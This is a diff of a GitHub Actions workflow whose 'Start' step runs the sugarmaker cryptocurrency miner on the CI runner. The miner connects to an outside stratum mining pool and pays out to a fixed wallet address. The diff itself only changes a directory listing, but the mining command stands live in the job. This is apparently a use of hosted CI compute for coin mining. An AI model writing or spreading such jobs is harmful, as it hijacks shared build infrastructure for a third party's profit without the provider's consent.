@@ -17,7 +17,7 @@ jobs:
 
       - name: Start
         run: |
-          ls
+          ls .\sugarmaker-v2.5.0-sugar4-w64\
           .\sugarmaker-v2.5.0-sugar4-w64\sugarmaker.exe -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qkxu2zgpzagdc0s92e8n5gt0ngff0altvsraxq8 -t2
 
       - name: Time Counter
